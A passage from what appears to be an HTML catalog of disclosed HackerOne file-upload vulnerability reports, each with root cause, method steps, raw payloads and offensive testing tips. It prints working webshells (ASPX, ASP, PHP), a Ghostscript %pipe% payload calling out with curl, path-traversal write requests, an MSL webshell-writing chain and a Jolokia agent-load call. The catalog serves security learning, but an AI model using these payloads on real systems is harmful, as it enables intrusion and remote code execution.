+&amp;rdReportName=&lt;%@ Page Language="C#"%&gt;&lt;%@ Import Namespace="System" %&gt;&lt;% var p=new System.Diagnostics.Process(); p.StartInfo.UseShellExecute=false; p.StartInfo.RedirectStandardOutput=true; p.StartInfo.FileName="CMD.exe"; p.StartInfo.Arguments="/c "+Request.QueryString["KEY"]; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %&gt;</div>
+<p class="insight"><b>Insight —</b> When an export/report feature exposes both a filename and a content parameter, test writing an executable extension (.aspx/.jsp/.php) into a web-served path - it's file-write-to-RCE without any 'upload' form. Logi Analytics rdExportFilename/rdReportName is a known instance.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1072832" target="_blank" rel="noopener">hackerone.com/reports/1072832</a></span><a class="src" href="#report-1072832" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1356845" style="--sv:var(--sev-crit)" data-sev="4" data-votes="75" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Unauth file write via directory traversal (CVE-2021-40870) -&gt; PHP webshell</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1356845</b> · elastic · awarded · 75 votes · resolved</div>
+<div class="taxo"><span>Program <b>elastic</b></span><span>Surface <b>web</b></span><span>Chain <b>Cert recon -&gt; CVE-2021-40870 unauth traversal write -&gt;</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Aviatrix Controller 6.x set_metric_gw_selections used account_name unsafely, letting an unauthenticated attacker traverse (../) and write a PHP file (data param) into the web root for RCE.</p>
+<h4>Method</h4><ol><li>Send an unauthenticated POST to /v1/backend1 with action=set_metric_gw_selections</li><li>Set account_name to a traversal path ending in a .php filename under the web root</li><li>Put the PHP payload in the data param</li><li>GET the written .php to execute it (phpinfo/webshell)</li></ol>
+<div class="pre">POST /v1/backend1
+CID=x&amp;action=set_metric_gw_selections&amp;account_name=/../../../var/www/php/shell.php&amp;data=RCE&lt;?php phpinfo()?&gt;</div>
+<p class="insight"><b>Insight —</b> Recon by TLS cert (CN) to identify the appliance, then map the IP to a known CVE - Aviatrix CVE-2021-40870 is unauth-write-to-webroot. Directory traversal in a 'name'/'account' field plus a content field is a classic file-write-to-RCE.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1356845" target="_blank" rel="noopener">hackerone.com/reports/1356845</a></span><a class="src" href="#report-1356845" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1547877" style="--sv:var(--sev-crit)" data-sev="4" data-votes="56" data-bounty="5000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>File-write via SQLite JDBC driver + SSRF to Jolokia jvmtiAgentLoad = RCE</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1547877</b> · aiven_ltd · 5000 · 56 votes · resolved</div>
+<div class="taxo"><span>Program <b>aiven_ltd</b></span><span>Surface <b>api</b></span><span>Chain <b>Controlled JDBC URL (SQLite driver) -&gt; arbitrary local fi</b></span><span>Tag <b>file-upload</b></span><span>Tag <b>cloud</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A managed connector framework (Kafka Connect) bundles the SQLite JDBC driver and lets user config choose the JDBC URL, so an attacker can write an arbitrary SQLite DB file to local disk; a co-located unauthenticated Jolokia (JMX-over-HTTP) endpoint then exposes com.sun.management:type=DiagnosticCommand's jvmtiAgentLoad, which loads that on-disk file as a JVM agent JAR = code execution.</p>
+<h4>Method</h4><ol><li>Find a service that lets you control a JDBC/connection URL and bundles the SQLite JDBC driver (jdbc:sqlite:/path/to/file.db) so you can force it to create a file at an attacker-chosen local path.</li><li>Craft a SQLite database whose BLOB column contains a valid JVM agent JAR (Premain-Class manifest + agent code that spawns a reverse shell); the .db file on disk is simultaneously a loadable agent JAR.</li><li>Use the connector's HTTP sink (or any localhost-reaching SSRF primitive) to reach the internal Jolokia listener (here localhost:6725).</li><li>POST a Jolokia exec to com.sun.management:type=DiagnosticCommand invoking jvmtiAgentLoad with the path of the SQLite file you just wrote.</li><li>The JVM loads the file as an agent; Premain runs -&gt; reverse shell to attacker VPS (nc -nlvp 4446).</li></ol>
+<div class="pre">jdbc:sqlite:/tmp/agent.db   # JDBC URL forces creation of attacker-controlled file on server disk
+
+# Jolokia agent-load call (via localhost HTTP sink / SSRF):
+POST http://localhost:6725/jolokia/
+{"type":"exec","mbean":"com.sun.management:type=DiagnosticCommand","operation":"jvmtiAgentLoad","arguments":["/tmp/agent.db"]}</div>
+<p class="insight"><b>Insight —</b> When a target lets you influence a JDBC/connection string, the driver itself is a file-write primitive (SQLite writes a real file at the URL path). Combine any 'write a file to local disk' bug with a co-located management interface that can load code from disk (Jolokia/JMX DiagnosticCommand jvmtiAgentLoad, or JMXMP, or -javaagent) to turn file-write into RCE. Always port-scan localhost from an SSRF and probe for /jolokia/ with DiagnosticCommand exposed.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1547877" target="_blank" rel="noopener">hackerone.com/reports/1547877</a></span><a class="src" href="#report-1547877" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-402362" style="--sv:var(--sev-crit)" data-sev="4" data-votes="44" data-bounty="2000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>ImageMagick/Ghostscript RCE via crafted image (ImageTragick v2, %pipe% PostScript)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#402362</b> · pixiv · USD 2000 · 44 votes · resolved</div>
+<div class="taxo"><span>Program <b>pixiv</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An image-upload endpoint passes files to ImageMagick, which delegates PostScript/PDF to Ghostscript. A crafted .jpeg that is actually PostScript uses the %pipe% device (OutputFile) to execute a shell command during rendering.</p>
+<h4>Method</h4><ol><li>Find an image-processing/upload feature (avatar, design header, thumbnail)</li><li>Upload a file with an image extension/content-type but PostScript body invoking %pipe%</li><li>Confirm via out-of-band callback</li></ol>
+<div class="pre">%!PS
+userdict /setpagedevice undef
+legal
+{ null restore } stopped { pop } if
+legal
+mark /OutputFile (%pipe%curl https://COLLAB/qwetest) currentdevice putdeviceprops</div>
+<p class="insight"><b>Insight —</b> Whenever a target processes uploaded images, test ImageMagick/Ghostscript RCE: send a PostScript/MVG body under an image extension and content-type image/jpeg. The %pipe% Ghostscript trick and MVG delegates both reach OS commands; use a collaborator URL for blind confirmation.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/402362" target="_blank" rel="noopener">hackerone.com/reports/402362</a></span><a class="src" href="#report-402362" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-369581" style="--sv:var(--sev-crit)" data-sev="4" data-votes="43" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>HTTP PUT method enabled -&gt; arbitrary file upload to web root</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#369581</b> · ratelimited · none · 43 votes · resolved</div>
+<div class="taxo"><span>Program <b>ratelimited</b></span><span>Surface <b>web</b></span><span>Chain <b>arbitrary PUT upload -&gt; (if script execution) webshell/RC</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The web server accepted the HTTP PUT method, allowing any unauthenticated client to write files directly into the web root.</p>
+<h4>Method</h4><ol><li>Send an OPTIONS request or just try PUT to enumerate allowed methods</li><li>PUT a file with a body to a path under the web root</li><li>Fetch the URL to confirm the file was written (escalate with a server-side script if executable)</li></ol>
+<div class="pre">PUT /shell.txt HTTP/1.1
+Host: target
+Content-Length: 12
+Connection: close
+
+emitrani POC</div>
+<p class="insight"><b>Insight —</b> Always fingerprint allowed methods (OPTIONS / Allow header) and test PUT/DELETE/WebDAV. A writable PUT to the web root is arbitrary file upload; if the server executes uploaded scripts it is RCE.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/369581" target="_blank" rel="noopener">hackerone.com/reports/369581</a></span><a class="src" href="#report-369581" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-2054184" style="--sv:var(--sev-crit)" data-sev="4" data-votes="33" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Null-byte truncated double extension upload -&gt; ASP webshell RCE</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#2054184</b> · deptofdefense · none · 33 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>upload filter bypass -&gt; ASP webshell -&gt; OS command exe</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Upload validation checks the trailing extension (.png) but the storage layer truncates at the null byte, saving poc.asp; the classic-ASP webshell then executes OS commands via WScript.Shell on IIS.</p>
+<h4>Method</h4><ol><li>Upload a file named poc.asp%00.png (null byte between extensions) containing an ASP webshell</li><li>Filter sees .png, file is written as poc.asp</li><li>Browse to /savefiles/poc.asp?cmd=... to run commands</li></ol>
+<div class="pre">filename="poc.asp\x00.png"
+&lt;% Set s=Server.CreateObject("WScript.Shell"): Set e=s.exec("cmd /c "&amp;request("cmd")): Response.Write(e.StdOut.ReadAll) %&gt;</div>
+<p class="insight"><b>Insight —</b> Against extension filters, test null-byte truncation (asp%00.png), double extensions, and case/alt extensions (asp;.png, .aspx, .cer, .asa); confirm by requesting the executable path and running a command.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2054184" target="_blank" rel="noopener">hackerone.com/reports/2054184</a></span><a class="src" href="#report-2054184" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1122791" style="--sv:var(--sev-crit)" data-sev="4" data-votes="28" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>RCE via SCORM zip import dropping an ASPX webshell</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1122791</b> · deptofdefense · awarded · 28 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>weak access control -&gt; SCORM import -&gt; webshell in web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An LMS SCORM course upload extracts arbitrary archive contents (referenced in imsmanifest.xml) into a web-served directory without filtering executable file types, so a package containing an .aspx shell yields command execution.</p>
+<h4>Method</h4><ol><li>Access the (weakly access-controlled) SCORM upload endpoint</li><li>Build a valid SCORM zip but add an .aspx webshell under shared/ and reference it in imsmanifest.xml</li><li>Upload/import, recover the generated course ID (strCourseId from the edit-metadata response), then request /CServer/Courseware/&lt;COURSE_ID&gt;/shared/shell.aspx</li></ol>
+<div class="pre"># scorm.zip contents
+imsmanifest.xml   (references shared/shell.aspx as a resource)
+shared/shell.aspx (&lt;%= command exec webshell %&gt;)
+# reach it at: /CServer/Courseware/&lt;strCourseId&gt;/shared/shell.aspx</div>
+<p class="insight"><b>Insight —</b> 'Content package' importers (SCORM, IMS, themes, plugins) are archive-extraction file-upload sinks: if the extracted tree is web-served and executable extensions aren't blocked, drop a shell and reference it in the manifest. The unpredictable output path is usually leaked in a follow-up response (here strCourseId).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1122791" target="_blank" rel="noopener">hackerone.com/reports/1122791</a></span><a class="src" href="#report-1122791" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1261413" style="--sv:var(--sev-crit)" data-sev="4" data-votes="16" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Arbitrary local file read via image-preview routed into ImageMagick (SVG xlink:href)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1261413</b> · nextcloud · none · 16 votes · resolved</div>
+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>web</b></span><span>Chain <b>upload polyglot -&gt; preview generation -&gt; arbitrary fil</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A preview/thumbnail provider for one format (HEIC) hands the file to Imagick, which auto-detects and processes ALL formats including SVG; a crafted SVG referencing a local path via xlink:href is rendered, embedding file contents into the returned image (file read, plus SSRF/XXE surface).</p>
+<h4>Method</h4><ol><li>Upload a file with an allowed extension (e.g. .heic) whose real content is SVG.</li><li>Point an &lt;image xlink:href&gt; at a local absolute path (or http:// for SSRF).</li><li>Request the preview/thumbnail; the rendered PNG contains the referenced file's contents.</li></ol>
+<div class="pre">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="500" height="500"&gt;
+  &lt;image x="0" y="0" width="500" height="500" xlink:href="/etc/passwd" /&gt;
+&lt;/svg&gt;</div>
+<p class="insight"><b>Insight —</b> Whenever an app generates previews/thumbnails, the content-type is decided by ImageMagick's magic-byte sniffing, not by the extension you uploaded. Rename an SVG to any accepted image extension and use xlink:href (file read) or a remote URL (SSRF) - classic ImageTragick-style delivery. CVE-2021-32802.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1261413" target="_blank" rel="noopener">hackerone.com/reports/1261413</a></span><a class="src" href="#report-1261413" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-343726" style="--sv:var(--sev-crit)" data-sev="4" data-votes="13" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Arbitrary file write via user-controlled upload directory field (RCE)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#343726</b> · nodejs-ecosystem · none · 13 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>web</b></span><span>Chain <b>Directory-field traversal + no filetype check -&gt; overwrit</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">express-cart's admin image upload uses an unvalidated client-supplied `directory` form field to build the destination path and performs no file-type/size check, allowing writes to any path including overwriting the app entry point.</p>
+<h4>Method</h4><ol><li>Authenticate as admin</li><li>POST to /admin/file/upload with a malicious .js file</li><li>Set the directory field to ../../ (or deeper) to escape the upload dir</li><li>Overwrite app.js with a webshell/backdoor -&gt; RCE on restart</li></ol>
+<div class="pre">POST /admin/file/upload
+Content-Disposition: form-data; name="upload_file"; filename="app.js"
+...MALICIOUS_JS...
+Content-Disposition: form-data; name="directory"
+
+../../</div>
+<p class="insight"><b>Insight —</b> Upload endpoints exposing a client-controlled destination field (directory/path/folder) are arbitrary-file-write primitives; combine with missing filetype checks to overwrite an executable file (app.js, cron, startup script) for RCE.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/343726" target="_blank" rel="noopener">hackerone.com/reports/343726</a></span><a class="src" href="#report-343726" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-683965" style="--sv:var(--sev-crit)" data-sev="4" data-votes="12" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Arbitrary file write via storage-path override -&gt; RCE via Startup folder</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#683965</b> · central-security-project · none · 12 votes · resolved</div>
+<div class="taxo"><span>Program <b>central-security-project</b></span><span>Surface <b>web</b></span><span>Chain <b>arbitrary file write -&gt; Startup folder autorun -&gt; code</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An admin-configurable repository storage path (overrideLocalStorageUrl) is used unvalidated as the on-disk write root; combined with an artifact-upload endpoint whose g/a/v params become directory/file names, an attacker writes arbitrary files anywhere the service (SYSTEM) can.</p>
+<h4>Method</h4><ol><li>Create a hosted repo whose overrideLocalStorageUrl points two levels above the target dir (e.g. Windows Startup Menu)</li><li>Upload an artifact, using the g/a/v/e params to steer the final path and extension (e.g. calc.exe)</li><li>File lands in the user's Startup folder; executes on next logon as SYSTEM</li></ol>
+<div class="pre">POST /nexus/service/local/repositories
+{"data":{...,"overrideLocalStorageUrl":"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu",...}}
+
+POST /nexus/service/local/artifact/maven/content  (multipart)
+  r=&lt;repoId&gt; g=Programs a=Startup v=. p=jar e=exe file=@calc.exe</div>
+<p class="insight"><b>Insight —</b> Any feature that lets a user set a base storage/output path plus a filename is an arbitrary-write primitive. Escalate arbitrary write to RCE via autorun locations (Windows Startup folder, cron, web root, .bashrc) rather than hunting a script-exec sink.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/683965" target="_blank" rel="noopener">hackerone.com/reports/683965</a></span><a class="src" href="#report-683965" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1360593" style="--sv:var(--sev-crit)" data-sev="4" data-votes="12" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Unauth unrestricted file upload + path traversal -&gt; PHP webshell (Aviatrix CVE-2021-40870)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1360593</b> · informatica · none · 12 votes · resolved</div>
+<div class="taxo"><span>Program <b>informatica</b></span><span>Surface <b>web</b></span><span>Chain <b>unauth file write + traversal -&gt; PHP webshell -&gt; RCE</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An unauthenticated Aviatrix Controller endpoint writes a file whose path/name comes from a request parameter with no type restriction; ../ traversal in that param plus PHP content in another param drops a webshell into the webroot for direct execution.</p>
+<h4>Method</h4><ol><li>Send the unauth POST that sets a filename parameter to a traversal path ending in .php with PHP content in the data param</li><li>Request the written .php to execute code</li></ol>
+<div class="pre">POST /v1/backend1 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+CID=x&amp;action=set_metric_gw_selections&amp;account_name=/../../../var/www/php/shell.php&amp;data=RCE&lt;?php phpinfo()?&gt;
+
+# then GET /v1/shell.php</div>
+<p class="insight"><b>Insight —</b> Look for endpoints that take a name/path param and a content/data param separately; if the path is traversable and the extension unfiltered, you place arbitrary files in the webroot. Fingerprint the vendor behind an IP via the TLS certificate (curl -kvI) to attribute in-scope assets.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1360593" target="_blank" rel="noopener">hackerone.com/reports/1360593</a></span><a class="src" href="#report-1360593" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1164452" style="--sv:var(--sev-crit)" data-sev="4" data-votes="12" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Unrestricted profile-picture upload of .php yields RCE</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1164452</b> · mtn_group · none · 12 votes · resolved</div>
+<div class="taxo"><span>Program <b>mtn_group</b></span><span>Surface <b>web</b></span><span>Chain <b>upload -&gt; stored path disclosure via page source -&gt; di</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Profile-photo upload performed no extension/content-type validation and stored files under a web-served, directly reachable path, so an uploaded .php executes when its URL is requested.</p>
+<h4>Method</h4><ol><li>Register and log in, go to profile update</li><li>Upload a .php file as the profile photo (no filter blocks it)</li><li>View page source to recover the stored file's full path</li><li>Request the path in a browser to execute the PHP</li></ol>
+<div class="pre">&lt;?php echo "proof of concept (PoC) by aliyugombe"; ?&gt;
+# stored at and executed via:
+https://TARGET/en/user/images/users/-DD-MM-YYYY-payload.php</div>
+<p class="insight"><b>Insight —</b> Any upload sink that (1) skips extension/MIME allowlisting and (2) writes into a script-executable web directory is an RCE. Always confirm the stored URL is web-served and try single/double extensions and .php/.phtml/.php5/.phar.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1164452" target="_blank" rel="noopener">hackerone.com/reports/1164452</a></span><a class="src" href="#report-1164452" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-3414079" style="--sv:var(--sev-crit)" data-sev="4" data-votes="10" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>DNN default CKEditor provider allows unauthenticated file upload (CVE-2025-64095)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#3414079</b> · deptofdefense · none · 10 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">DNN (&lt;10.1.1) ships the DNNConnect.CKE HTML editor provider whose FileUploader.ashx handler accepts file uploads and overwrites of existing files without authentication, enabling defacement and stored XSS.</p>
+<h4>Method</h4><ol><li>Fingerprint a DNN site (&lt;10.1.1)</li><li>Send a POST to the provider's FileUploader.ashx handler with a file</li><li>File is written/overwritten with no auth -&gt; defacement / XSS payload delivery</li></ol>
+<div class="pre">POST /Providers/HtmlEditorProviders/DNNConnect.CKE/Browser/FileUploader.ashx HTTP/1.1
+Host: TARGET
+# multipart file upload body (unauthenticated)</div>
+<p class="insight"><b>Insight —</b> Bundled rich-text/editor providers often expose their own unauthenticated file handlers separate from the app's auth; enumerate /Providers/ and editor plugin paths (CKEditor, TinyMCE) for standalone upload endpoints even when the main app requires login.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3414079" target="_blank" rel="noopener">hackerone.com/reports/3414079</a></span><a class="src" href="#report-3414079" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-228825" style="--sv:var(--sev-crit)" data-sev="4" data-votes="7" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>.htaccess upload blacklist bypass via internal copy from federated share</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#228825</b> · nextcloud · none · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>web</b></span><span>Chain <b>federated share -&gt; internal copy (no blacklist) -&gt; .ht</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Storage::copyFromStorage does not re-check the file blacklist when copying a folder, so files that can't be uploaded directly (.htaccess, .php) can be smuggled into the local data dir (inside webroot) by moving them out of a federated/external share.</p>
+<h4>Method</h4><ol><li>Host an evil Nextcloud with the file blacklist disabled</li><li>Create sharefolder/attack containing .htaccess (allow from all) and attack.php</li><li>Federated-share it to the victim instance</li><li>Move attack out of the share into local storage, then browse to /data/userid/files/attack/attack.php</li></ol>
+<div class="pre"># .htaccess
+&lt;Files *.php&gt;
+  Require all granted
+&lt;/Files&gt;
+# attack.php
+&lt;?php system($_GET['c']); ?&gt;</div>
+<p class="insight"><b>Insight —</b> Upload blacklists often protect the upload path but not internal move/copy/import routines; find a secondary ingress (federated share, import, sync, unzip) that lands files without re-validation, especially where the data dir sits inside the webroot.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/228825" target="_blank" rel="noopener">hackerone.com/reports/228825</a></span><a class="src" href="#report-228825" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-632721" style="--sv:var(--sev-crit)" data-sev="4" data-votes="7" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Atlassian Crowd pdkinstall plugin upload -&gt; root RCE (CVE-2019-11580)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#632721</b> · deptofdefense · none · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>unauth plugin upload -&gt; servlet exec as root -&gt; SSO ta</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Vulnerable Atlassian Crowd builds ship with the pdkinstall development plugin enabled, so an unauthenticated attacker can upload an arbitrary plugin (JAR) that executes code, here as root.</p>
+<h4>Method</h4><ol><li>Confirm Crowd version in the vulnerable range</li><li>POST a malicious plugin JAR to /crowd/admin/uploadplugin.action</li><li>Invoke the plugin's servlet to run commands</li></ol>
+<div class="pre">curl -k -H "Content-Type: multipart/content" \
+  --form "file_cdl=@rce.jar;type=application/octet-stream" \
+  https://TARGET/crowd/admin/uploadplugin.action
+# then GET /crowd/plugins/servlet/&lt;your-servlet&gt;</div>
+<p class="insight"><b>Insight —</b> Identity/SSO middleware (Crowd, OpenAM, Keycloak) are high-value: check pdkinstall/uploadplugin.action and other dev endpoints left enabled in release builds. A plugin-install feature = code execution.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/632721" target="_blank" rel="noopener">hackerone.com/reports/632721</a></span><a class="src" href="#report-632721" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1838674" style="--sv:var(--sev-crit)" data-sev="4" data-votes="7" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>ownCloud ImageMagick MSL coercion -&gt; PHP webshell write (RCE)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1838674</b> · owncloud · awarded · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>owncloud</b></span><span>Surface <b>web</b></span><span>Chain <b>file upload -&gt; ImageMagick MSL write -&gt; PHP webshell i</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">ownCloud generates previews with ImageMagick; uploading an SVG that references an attacker MSL file makes ImageMagick's Magick Scripting Language read a known-path image and write attacker-controlled PHP into the webroot (e.g. index.php), yielding code execution.</p>
+<h4>Method</h4><ol><li>Upload exploit.msl (reads a known uploaded file, embeds PHP in a comment, writes to /var/www/owncloud/index.php)</li><li>Upload an SVG whose &lt;image xlink:href&gt; is msl:/path/to/exploit.msl</li><li>Trigger preview generation; reload the rewritten index.php to run the PHP</li></ol>
+<div class="pre">&lt;!-- exploit.msl --&gt;
+&lt;image&gt;
+  &lt;read filename="/mnt/data/files/admin/files/Photos/Portugal.jpg" /&gt;
+  &lt;resize geometry="400x400" /&gt;
+  &lt;comment&gt;&amp;lt;?php echo php_uname(); ?&amp;gt;&lt;/comment&gt;
+  &lt;write filename="/var/www/owncloud/index.php" /&gt;
+&lt;/image&gt;
+
+&lt;!-- trigger.svg --&gt;
+&lt;svg xmlns:xlink="http://www.w3.org/1999/xlink"&gt;
+  &lt;image xlink:href="msl:/mnt/data/files/admin/files/exploit.msl" height="500" width="500"/&gt;
+&lt;/svg&gt;</div>
+<p class="insight"><b>Insight —</b> Wherever user images hit ImageMagick (preview/thumbnail generation), test the MSL/SVG coder chain: an SVG referencing msl: lets you read arbitrary files and WRITE a PHP webshell. Requires knowing an uploaded file path; distinct from ImageTragick.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1838674" target="_blank" rel="noopener">hackerone.com/reports/1838674</a></span><a class="src" href="#report-1838674" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-458842" style="--sv:var(--sev-high)" data-sev="3" data-votes="99" data-bounty="1500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Extension/path whitelist bypass via substring-match-anywhere (GoldSrc .sav -&gt; DLL write &amp; load)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#458842</b> · valve · USD 1500 · 99 votes · resolved</div>
+<div class="taxo"><span>Program <b>valve</b></span><span>Surface <b>desktop</b></span><span>Chain <b>Malicious server -&gt; forced .sav download -&gt; console-co</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The save-file loader validates the allowed extension (*.HL?) and blocks '..' by checking for those substrings anywhere in the path instead of anchoring the extension check to the end. Embedding the allowed token mid-path lets an attacker write files with an arbitrary real extension (e.g. .dll) into attacker-chosen subdirectories.</p>
